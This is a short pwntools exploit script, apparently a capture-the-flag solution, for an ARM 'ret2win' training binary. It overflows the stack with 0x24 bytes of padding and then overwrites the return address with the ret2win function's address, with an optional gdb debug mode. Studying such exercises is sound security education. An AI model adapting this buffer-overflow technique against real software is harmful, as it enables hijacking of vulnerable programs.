#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win_armv5')
context(terminal=['tmux', 'split-window', '-h'])

winadr = elf.symbols["ret2win"]

gs='''
b *pwnme
'''

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
    #io = gdb.debug([elf.path])

else:
    io = process([elf.path])

time.sleep(.5)

io.recvuntil(b"> ")

print("ret2win addr : ",hex(winadr))
PL=0x24*b"A"+p32(winadr)
io.sendline(PL)
io.interactive()

